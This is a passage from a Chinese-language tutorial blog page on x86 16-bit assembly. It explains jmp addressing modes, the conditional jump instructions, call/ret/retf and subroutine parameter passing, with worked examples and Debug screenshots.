class="language-armasm">jmp bx                <span class="token comment">; 寄存器寻址，ip = bx</span>jmp word ptr <span class="token punctuation">[</span>bx<span class="token punctuation">]</span>     <span class="token comment">; 寄存器间接寻址，ip = [ds:bx]</span>jmp word ptr table    <span class="token comment">; 直接寻址，ip = [ds:table]</span>jmp table<span class="token punctuation">[</span>bx<span class="token punctuation">]</span>         <span class="token comment">; 寄存器相对寻址，ip = [ds:(table + bx)]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>第一条指令执行后：IP &#x3D; BX &#x3D; 2000h<br>第二条指令执行后：IP &#x3D; (DS:2000h) &#x3D; (42000h) &#x3D; 6050h<br>第三条指令执行后：IP &#x3D; (DS:2000h) &#x3D; (42000h) &#x3D; 6050h<br>第四条指令执行后：IP &#x3D; (DS:4000h) &#x3D; (44000h) &#x3D; 8090h</p><hr><h3 id="jmp-dword-ptr-内存单元"><a href="#jmp-dword-ptr-内存单元" class="headerlink" title="jmp dword ptr 内存单元"></a>jmp dword ptr 内存单元</h3><blockquote><p><strong>段间间接转移</strong>，从内存单元地址处开始的两个字，高地址的一个字是转移的目的段地址，低地址的一个字是转移的目的偏移地址</p><p>内存单元地址可以用寻址方式的任一格式给出</p></blockquote><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> 0123hmov ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> axmov word ptr ds:<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span>jmp dword ptr ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token comment">; 执行后，(CS) = 0，(IP) = 0123h，CS:IP 指向 0000:0123</span>mov ax<span class="token punctuation">,</span> 4567hmov <span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token punctuation">,</span> axmov word ptr <span class="token punctuation">[</span>bx <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span>jmp dword ptr <span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token comment">; 执行后，(CS) = 0，(IP) = 4567h，CS:IP 指向 0000:4567</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>假设 BX &#x3D; 2000h，DS &#x3D; 4000h，(42000h) &#x3D; 6050h，(42002h) &#x3D; 1234h</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">jmp dword ptr <span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行指令后：<br>IP &#x3D; (DS:2000h) &#x3D; (40000h + 2000h) &#x3D; (42000h) &#x3D; 6050h<br>CS &#x3D; (42002h) &#x3D; 1234h</p><hr><h2 id="条件转移指令"><a href="#条件转移指令" class="headerlink" title="条件转移指令"></a>条件转移指令</h2><blockquote><p>所有的有条件转移指令都是短转移，对 IP 修改的范围为：<code>-128 ~ 127</code>，在机器码中包含的是转移的位移，而不是目的地址</p></blockquote><table><thead><tr><th align="left">指令</th><th align="left">跳转条件</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>jz</code>、<code>je</code></td><td align="left"><code>ZF = 1</code></td><td align="left">结果为 0 则转移（结果相等则转移）</td></tr><tr><td align="left"><code>jnz</code>、<code>jne</code></td><td align="left"><code>ZF = 0</code></td><td align="left">结果不为 0 则转移（结果不相等则转移）</td></tr><tr><td align="left"><code>js</code></td><td align="left"><code>SF = 1</code></td><td align="left">结果为负则转移</td></tr><tr><td align="left"><code>jns</code></td><td align="left"><code>SF = 0</code></td><td align="left">结果为正则转移</td></tr><tr><td align="left"><code>jo</code></td><td align="left"><code>OF = 1</code></td><td align="left">结果溢出则转移</td></tr><tr><td align="left"><code>jno</code></td><td align="left"><code>OF = 0</code></td><td align="left">结果不溢出则转移</td></tr><tr><td align="left"><code>jp</code>、<code>jpe</code></td><td align="left"><code>PF = 1</code></td><td align="left">奇偶位为 1 则转移（偶数个 1 则转移）</td></tr><tr><td align="left"><code>jnp</code>、<code>jpo</code></td><td align="left"><code>PF = 0</code></td><td align="left">奇偶位为 0 则转移（奇数个 1 则转移）</td></tr><tr><td align="left"><code>jcxz</code></td><td align="left"><code>CX = 0</code></td><td align="left">CX 寄存器为 0 则转移</td></tr><tr><td align="left"><code>jc</code>、<code>jb</code>、<code>jnae</code></td><td align="left"><code>CF = 1</code></td><td align="left">【无符号数】进位位为 1 则转移（低于则转移）（不高于等于则转移）</td></tr><tr><td align="left"><code>jnc</code>、<code>jnb</code>、<code>jae</code></td><td align="left"><code>CF = 0</code></td><td align="left">【无符号数】进位位为 0 则转移（不低于则转移）（高于等于则转移）</td></tr><tr><td align="left"><code>jbe</code>、<code>jna</code></td><td align="left"><code>CF = 1</code> or <code>ZF = 1</code></td><td align="left">【无符号数】低于等于则转移（不高于则转移）</td></tr><tr><td align="left"><code>jnbe</code>、<code>ja</code></td><td align="left"><code>CF = 0</code> and <code>ZF = 0</code></td><td align="left">【无符号数】不低于等于则转移（高于则转移）</td></tr><tr><td align="left"><code>jl</code>、<code>jnge</code></td><td align="left"><code>SF ≠ OF</code></td><td align="left">【有符号数】小于则转移（不大于等于则转移）</td></tr><tr><td align="left"><code>jnl</code>、<code>jge</code></td><td align="left"><code>SF ＝ OF</code></td><td align="left">【有符号数】不小于则转移（大于等于则转移）</td></tr><tr><td align="left"><code>jle</code>、<code>jng</code></td><td align="left"><code>SF ≠ OF</code> or <code>ZF = 1</code></td><td align="left">【有符号数】小于等于则转移（不大于则转移）</td></tr><tr><td align="left"><code>jnle</code>、<code>jg</code></td><td align="left"><code>SF ＝ OF</code> and <code>ZF = 0</code></td><td align="left">【有符号数】不小于等于则转移（大于则转移）</td></tr></tbody></table><hr><h2 id="call-和-ret"><a href="#call-和-ret" class="headerlink" title="call 和 ret"></a>call 和 ret</h2><blockquote><p><strong>call 和 ret 都是转移指令</strong>，他们都修改 IP 或都同时修改 CS 和 IP。这两个指令常被共同用来实现子程序的设计</p><p><em>call 指令不能实现短转移。与 jmp 不同的是，call 指令会先向堆栈保存返回地址，再实现程序的转移</em></p></blockquote><ul><li><p>主程序通过 call 指令启动子程序，call 指令执行时，会将下一条指令的地址压入堆栈保存（执行完子程序后会回到该地址继续往下执行，即：ret 回下一条指令的地址），再把子程序的入口地址送入 IP（CS）寄存器，以便实现转移</p></li><li><p>CPU 执行 call 指令时，分为两步：</p><ol><li><strong>将当前的 IP 或 CS 和 IP 压入栈中</strong>，即：<br><code>(SP) = (SP) - 2</code><br><code>((SS) * 16 + (SP)) = (IP)</code><br>或者：<br><code>(SP) = (SP) - 2</code><br><code>((SS) * 16 + (SP)) = (CS)</code><br><code>(SP) = (SP) - 2</code><br><code>((SS) * 16 + (SP)) = (IP)</code></li><li><strong>转移</strong><br><code>(IP) = XXXX</code><br>或者：<br><code>(CS) = XXXX</code><br><code>(IP) = XXXX</code></li></ol></li></ul><hr><h3 id="call-标号"><a href="#call-标号" class="headerlink" title="call 标号"></a>call 标号</h3><blockquote><p>将当前 IP 压栈后，转到标号处执行指令</p></blockquote><ul><li>操作流程：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token punctuation">(</span>sp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>sp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token punctuation">(</span>sp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ip<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">16</span> 位位移<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>CPU 在执行 <code>call 标号</code> 时，相当于执行：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">push <span class="token instruction keyword">IP</span>jmp near ptr 标号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>例如，执行如下代码：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:codesgcodesg segmentstart:        mov ax<span class="token punctuation">,</span> <span class="token number">0</span>        call s        inc ax    s:  pop ax            mov ax<span class="token punctuation">,</span> 4c00h        int 21hcodesg endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 Debug 中查看代码：  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_call1.png" alt="x86汇编_call1.png"></p><p>在 Debug 中运行：  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_call2.png" alt="x86汇编_call2.png"></p><p>如上图，执行程序后 AX &#x3D; 6，过程如下：</p><ol><li>执行到 <code>call s</code> 这一条指令时，IP 指向下一条指令 <code>inc ax</code> 的地址，即：IP &#x3D; 6</li><li>此时开始执行 <code>call s</code> 指令，将 IP &#x3D; 6 入栈，同时 IP 指向 s 所在的位置 <code>pop ax</code>，即：IP &#x3D; 7</li><li>当 <code>pop ax</code> 时，将栈上的 6 弹出到 AX，所以 AX &#x3D; 6</li></ol><hr><h3 id="call-far-ptr-标号"><a href="#call-far-ptr-标号" class="headerlink" title="call far ptr 标号"></a>call far ptr 标号</h3><blockquote><p>实现段间转移，会同时将当前 CS 和 IP 压栈后，转到标号处执行指令</p></blockquote><ul><li>操作流程：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token punctuation">(</span>sp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>sp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token punctuation">(</span>sp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>cs<span class="token punctuation">)</span><span class="token punctuation">(</span>sp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>sp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token punctuation">(</span>sp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">(</span>cs<span class="token punctuation">)</span> <span class="token operator">=</span> 标号所在段的段地址<span class="token punctuation">(</span>ip<span class="token punctuation">)</span> <span class="token operator">=</span> 标号在段中的偏移地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>CPU 在执行 <code>call far ptr 标号</code> 时，相当于执行：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">push <span class="token instruction keyword">CS</span>push <span class="token instruction keyword">IP</span>jmp far ptr 标号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>例如，执行如下代码：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:codesgcodesg segmentstart:mov ax<span class="token punctuation">,</span> <span class="token number">0</span>call far ptr sinc ax    s:  pop axadd ax<span class="token punctuation">,</span> axpop bxadd ax<span class="token punctuation">,</span> bxmov ax<span class="token punctuation">,</span> 4c00hint 21hcodesg endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 Debug 中查看代码：  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_call3.png" alt="x86汇编_call3.png"></p><p>在 Debug 中运行：  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_call4.png" alt="x86汇编_call4.png"></p><p>如上图，执行程序后 AX &#x3D; 077Ch，过程如下：</p><ol><li>执行到 <code>call far ptr s</code> 这一条指令时，IP 指向下一条指令 <code>inc ax</code> 的地址，即：IP &#x3D; 8</li><li>此时开始执行 <code>call far ptr s</code> 指令，将 CS &#x3D; 076Ch 和 IP &#x3D; 8 依次入栈，同时 IP 指向 s 所在的位置 <code>pop ax</code>，即：IP &#x3D; 9</li><li>当 <code>pop ax</code> 时，将栈上的 8 弹出到 AX，所以 AX &#x3D; 8，执行 <code>add ax, ax</code> 后，AX &#x3D; 16，即：10h</li><li>当 <code>pop bx</code> 时，将栈上的 076Ch 弹出到 BX，所以 BX &#x3D; 076Ch，执行 <code>add ax, bx</code> 后，AX &#x3D; 077Ch</li></ol><hr><h3 id="call-十六位寄存器"><a href="#call-十六位寄存器" class="headerlink" title="call 十六位寄存器"></a>call 十六位寄存器</h3><blockquote><p>将十六位寄存器中的值作为 IP 的值</p></blockquote><ul><li>操作流程：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token punctuation">(</span>sp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>sp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token punctuation">(</span>sp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span> <span class="token operator">=</span> 十六位寄存器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>CPU 在执行 <code>call 十六位寄存器</code> 时，相当于执行：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">push <span class="token instruction keyword">IP</span>jmp 十六位寄存器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>例如，执行如下代码：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:codesgcodesg segmentstart:mov ax<span class="token punctuation">,</span> <span class="token number">6</span>call axinc ax    mov bp<span class="token punctuation">,</span> spadd ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bp<span class="token punctuation">]</span>mov ax<span class="token punctuation">,</span> 4c00hint 21hcodesg endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 Debug 中查看代码：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_call5.png" alt="x86汇编_call5.png"></p><p>在 Debug 中运行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_call6.png" alt="x86汇编_call6.png"></p><p>如上图，执行程序后 AX &#x3D; Bh，过程如下：</p><ol><li>执行到 <code>call ax</code> 这一条指令时，IP 指向下一条指令 <code>inc ax</code> 的地址，即：IP &#x3D; 5</li><li>此时开始执行 <code>call ax</code> 指令，将 IP &#x3D; 5 入栈，同时 IP 指向 <code>ax</code> 所在的位置 <code>mov bp, sp</code>，即：IP &#x3D; 6</li><li>当 <code>mov bp, sp</code> 时，将栈顶指针 SP 的值送往 BP</li><li>当 <code>add ax, [bp]</code> 时，由于 BP &#x3D; SP 指向栈顶元素，所以 <code>[bp]</code> 就是栈上的第一个元素的值 5，即将栈上的 5 与 AX 相加，所以 AX &#x3D; 11，即：Bh</li></ol><hr><h3 id="call-word-ptr-内存单元"><a href="#call-word-ptr-内存单元" class="headerlink" title="call word ptr 内存单元"></a>call word ptr 内存单元</h3><ul><li>CPU 在执行 <code>call word ptr 内存单元</code> 时，相当于执行：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">push <span class="token instruction keyword">IP</span>jmp word ptr 内存单元<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov sp<span class="token punctuation">,</span> 10hmov ax<span class="token punctuation">,</span> 0123hmov ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> axcall word ptr ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token comment">; 执行后，(IP) = 0123h，(SP) = 0Eh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="call-dword-ptr-内存单元"><a href="#call-dword-ptr-内存单元" class="headerlink" title="call dword ptr 内存单元"></a>call dword ptr 内存单元</h3><ul><li>CPU 在执行 <code>call word ptr 内存单元</code> 时，相当于执行：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">push <span class="token instruction keyword">CS</span>push <span class="token instruction keyword">IP</span>jmp dword ptr 内存单元<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov sp<span class="token punctuation">,</span> 10hmov ax<span class="token punctuation">,</span> 0123hmov ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> axmov word ptr ds:<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span>call dword ptr ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token comment">; 执行后，(CS) = 0，(IP) = 0123h，(SP) = 0Ch</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="ret-和-retf"><a href="#ret-和-retf" class="headerlink" title="ret 和 retf"></a>ret 和 retf</h3><blockquote><p><strong>ret 指令用栈中的数据，修改 IP 的内容，实现近转移</strong><br><strong>retf 指令用栈中的数据，修改 CS 和 IP 的内容，实现远转移</strong></p></blockquote><ol><li>CPU 在执行 <code>ret</code> 时，操作流程：</li></ol><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token punctuation">(</span>IP<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>SS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token punctuation">(</span>SP<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>SP<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>SP<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token comment">; 相当于执行：</span><span class="token comment">; pop IP</span><span class="token comment">; 若执行的是 ret n 则操作流程为：</span><span class="token punctuation">(</span>IP<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>SS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token punctuation">(</span>SP<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>SP<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>SP<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">(</span>SP<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>SP<span class="token punctuation">)</span> <span class="token operator">+</span> n<span class="token comment">; 相当于执行：</span><span class="token comment">; pop IP</span><span class="token comment">; add SP, n</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>示例：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:codestack segmentdb <span class="token number">16</span> dup <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>stack endscode segmentmov ax<span class="token punctuation">,</span> 4c00hint 21hstart:  mov ax<span class="token punctuation">,</span> stackmov ss<span class="token punctuation">,</span> axmov sp<span class="token punctuation">,</span> <span class="token number">16</span>mov ax<span class="token punctuation">,</span> <span class="token number">0</span>    push axmov bx<span class="token punctuation">,</span> <span class="token number">0</span>retcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 <code>ret</code> 指令后，(IP) &#x3D; 0，CS:IP 指向代码段的第一条指令</p><ol start="2"><li>CPU 在执行 <code>retf</code> 时，操作流程：</li></ol><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token punctuation">(</span>IP<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>SS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token punctuation">(</span>SP<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>SP<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>SP<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">(</span>CS<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>SS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token punctuation">(</span>SP<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>SP<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>SP<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token comment">; 相当于执行：</span><span class="token comment">; pop IP</span><span class="token comment">; pop CS</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>示例：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:codestack segmentdb <span class="token number">16</span> dup <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>stack endscode segmentmov ax<span class="token punctuation">,</span> 4c00hint 21hstart:  mov ax<span class="token punctuation">,</span> stackmov ss<span class="token punctuation">,</span> axmov sp<span class="token punctuation">,</span> <span class="token number">16</span>mov ax<span class="token punctuation">,</span> <span class="token number">0</span>    push cs    push axmov bx<span class="token punctuation">,</span> <span class="token number">0</span>retfcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 <code>retf</code> 指令后，(IP) &#x3D; 0，CS:IP 指向代码段的第一条指令</p><hr><h3 id="call-和-ret-配合实现子程序"><a href="#call-和-ret-配合实现子程序" class="headerlink" title="call 和 ret 配合实现子程序"></a>call 和 ret 配合实现子程序</h3><ul><li>示例：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:codecode segmentstart:  mov ax<span class="token punctuation">,</span> <span class="token number">1</span>mov cx<span class="token punctuation">,</span> <span class="token number">3</span>call smov bx<span class="token punctuation">,</span> axmov ax<span class="token punctuation">,</span> 4c00hint 21hs:  add ax<span class="token punctuation">,</span> axloop sretcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上图，执行程序后 BX &#x3D; 8，过程如下：</p><ol><li>执行到 <code>call s</code> 这一条指令时，IP 指向下一条指令 <code>mov bx, ax</code> 的地址</li><li>此时开始执行 <code>call ax</code> 指令，将指令 <code>mov bx, ax</code> 的地址入栈，同时 IP 指向 s 所在的位置 <code>add ax, ax</code>，并执行 <code>add ax, ax</code></li><li>当 <code>loop s</code> 时，由于 CX &#x3D; 3，因此会执行三次 <code>add ax, ax</code> 指令，当 <code>loop s</code> 结束后，AX &#x3D; 8</li><li>当 <code>ret</code> 时，将栈上的指令 <code>mov bx, ax</code> 的地址弹出到 IP 寄存器，转而执行指令 <code>mov bx, ax</code>，因此 BX &#x3D; 8</li></ol><blockquote><p>根据上述分析，示例中的程序从标号 <code>s</code> 到 <code>ret</code> 这一段其实就是实现计算 $2 ^ {N}$ 的功能，因此可以通过 <code>call</code> 和 <code>ret</code> 实现子程序，类似于 C 语言中的函数</p><p>只在要使用的时候通过 <code>call</code> 去调用，调用完后再通过 <code>ret</code> 回到 <code>call</code> 指令的下一条语句继续执行，从而实现子程序的调用</p></blockquote><ul><li>大致框架如下：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:codecode segmentmain: ···call sub1   <span class="token comment">; 调用子程序 sub1</span>··· mov ax<span class="token punctuation">,</span> 4c00hint 21hsub1: ···call sub2   <span class="token comment">; 调用子程序 sub2</span>···ret   <span class="token comment">; 返回到 main 中 call sub1 的下一条指令</span>sub2:···ret   <span class="token comment">; 返回到 sub1 中 call sub2 的下一条指令</span>code endsend main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="子程序的参数和结果传递"><a href="#子程序的参数和结果传递" class="headerlink" title="子程序的参数和结果传递"></a>子程序的参数和结果传递</h3><blockquote><p>子程序一般都要根据提供的参数处理一定的事务，因此传递参数、传递返回值很有必要</p><p><mark>使用寄存器来存储参数和结果是最常用的</mark>。调用者将参数送入寄存器并从寄存器中取出返回值，子程序从寄存器中取出参数并将返回值送入寄存器</p></blockquote><ul><li>示例：计算 data 段中第一组 word 数据的 3 次方，并将结果保存在后面一组 dword 单元中</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:code<span class="token punctuation">,</span> ds:datadata segmentdw <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span>dd <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>data endscode segmentmain: mov ax<span class="token punctuation">,</span> datamov ds<span class="token punctuation">,</span> axmov si<span class="token punctuation">,</span> <span class="token number">0</span>   <span class="token comment">; ds:si 指向第一组 word 单元</span>mov di<span class="token punctuation">,</span> <span class="token number">16</span>   <span class="token comment">; ds:di 指向后面一组 dword 单元</span>mov cx<span class="token punctuation">,</span> <span class="token number">8</span>s:mov bx<span class="token punctuation">,</span> <span class="token punctuation">[</span>si<span class="token punctuation">]</span>call sub1mov <span class="token punctuation">[</span>di<span class="token punctuation">]</span><span class="token punctuation">,</span> ax   <span class="token comment">; 存储结果的低 16 位</span>mov <span class="token punctuation">[</span>di<span class="token punctuation">]</span> . <span class="token number">2</span><span class="token punctuation">,</span> dx   <span class="token comment">; 存储结果的高 16 位</span>add si<span class="token punctuation">,</span> <span class="token number">2</span>   <span class="token comment">; ds:si 指向下一个 word 单元</span>add di<span class="token punctuation">,</span> <span class="token number">4</span>   <span class="token comment">; ds:di 指向下一个 dword 单元</span>loop smov ax<span class="token punctuation">,</span> 4c00hint 21h<span class="token comment">; 子程序：实现 n * n * n</span>sub1:mov ax<span class="token punctuation">,</span> bxmul bxmul bxretcode endsend main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在上述示例中，子程序只有一个参数，存放在 BX 中。如果有两个参数，那么可以选择两个寄存器来存放，但如果有更多参数，使用寄存器存放参数就不方便了</p><p>因此，<mark>也可以将参数存放在内存中，然后将内存单元的首地址存放在寄存器中，传递给子程序</mark>。对于批量的返回值，也可以用同样的方法</p></blockquote><ul><li>示例：将一个全是字母的字符串转化为大写</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:code<span 